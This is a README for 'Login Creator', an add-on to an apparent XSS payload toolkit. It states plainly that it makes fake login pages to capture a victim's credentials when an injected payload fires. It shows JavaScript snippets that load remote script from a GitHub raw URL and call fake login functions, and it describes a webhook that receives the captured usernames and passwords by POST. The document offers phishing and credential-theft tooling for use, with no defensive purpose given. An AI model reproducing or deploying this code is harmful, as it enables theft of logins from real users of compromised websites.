# Login Creator
This add-on helps you to create a fake login page to capture credentials of victim upon fire of payload (phishing/social engineering)

# Usage
Uncomment from line number 189 to 191 in `index.js` for HTML phishing. The line contains the following code:-
```javascript
$.getScript("https://raw.githubusercontent.com/shriyanss/payload-pro/main/addons/wordlist_fuzzer/wordlist_fuzzer.js", function () {
    fake_login_html('http://127.0.0.1:5500/addons/login_creator/forms/1.html');
});
```

For login using prompt, uncomment from line number 194 to 196, the line contains the following code:-
```javascript
$.getScript("https://raw.githubusercontent.com/shriyanss/payload-pro/main/addons/wordlist_fuzzer/wordlist_fuzzer.js", function () {
    fake_login_prompt(fire_id);
});
```

# Functioning
The function `fake_login_html()` is responsible for appending an HTML script to the end of body tag. It takes URL to the HTML template.

The fucntion `fake_login_prompt()` takes the `fire_id` for XSS payload fire and the webhook endpoint.

# Webhook
The `fake_login_prompt()` function requires a webhook with `fire_id`, `username`, and `password` as POST parameters.
